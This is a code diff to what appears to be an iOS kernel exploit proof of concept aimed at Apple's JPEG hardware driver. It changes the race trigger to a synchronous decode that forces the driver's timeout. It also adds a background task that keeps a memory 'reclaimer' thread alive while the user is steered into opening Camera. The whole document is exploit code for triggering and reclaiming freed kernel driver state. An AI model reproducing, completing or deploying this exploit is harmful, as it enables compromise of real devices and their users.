@@ -53,6 +53,7 @@ static UITextView *gLog = nil;
 static UIViewController *gVC = nil;
 static volatile int gStop = 0;
 static NSLock *gLogLock = nil;
+static UIBackgroundTaskIdentifier gBG = 0;
 
 static NSString *docsPath(void) {
     return [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
@@ -176,6 +177,19 @@ static int submitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     return submitted;
 }
 
+static void beginBackgroundTask(void) {
+    dispatch_async(dispatch_get_main_queue(), ^{
+        gBG = [[UIApplication sharedApplication] beginBackgroundTaskWithName:@"jpegreclaim" expirationHandler:^{
+            appendLog(@"background task expired");
+            if (gBG != 0 && gBG != UIBackgroundTaskInvalid) {
+                [[UIApplication sharedApplication] endBackgroundTask:gBG];
+                gBG = 0;
+            }
+        }];
+        appendLog(@"background task id=%lu", (unsigned long)gBG);
+    });
+}
+
 static void showCameraPrompt(void) {
     dispatch_async(dispatch_get_main_queue(), ^{
         NSURL *cameraURL = [NSURL URLWithString:@"camera://"];
@@ -263,7 +277,9 @@ static void reclaimAll(void) {
             }
             AppleJPEGDriverIOStruct input;
             AppleJPEGDriverIOStruct output = {0};
-            fillInput(&input, srcID, dstID, W, H, 1, 0x77770000 + round);
+            /* token = 0 => synchronous decode; the driver waits for completion
+               and returns kIOReturnTimeout (0xe00002d6) if the codec is stuck. */
+            fillInput(&input, srcID, dstID, W, H, 0, 0);
             size_t outSize = sizeof(output);
             CFTimeInterval t0 = CFAbsoluteTimeGetCurrent();
             kern_return_t sr = IOConnectCallStructMethod(c, 1, &input, sizeof(input), &output, &outSize);
@@ -274,15 +290,22 @@ static void reclaimAll(void) {
         appendLog(@"sync trigger done");
     });
 
-    /* Let the race run for 20s, then stop and trigger Camera. */
-    sleep(20);
+    /* Give the sync trigger time to hit the 10s timeout, then keep the
+       reclaimer alive while the user opens Camera. The background task gives
+       us ~30s of execution after the app is backgrounded. */
+    sleep(45);
+    appendLog(@"sync window done; keeping reclaimer alive for Camera");
+    beginBackgroundTask();
+    showCameraPrompt();
+
+    sleep(60);
     gStop = 1;
     dispatch_group_wait(rgroup, dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC));
     appendLog(@"reclaimer stop conn=%d req=%d fail=%d", rConn, rReq, rFail);
-    appendLog(@"showing CAMERA prompt");
-    showCameraPrompt();
-
-    sleep(30);
+    if (gBG != 0 && gBG != UIBackgroundTaskInvalid) {
+        [[UIApplication sharedApplication] endBackgroundTask:gBG];
+        gBG = 0;
+    }
     CFRelease(src);
     CFRelease(dst);
     IOObjectRelease(svc);
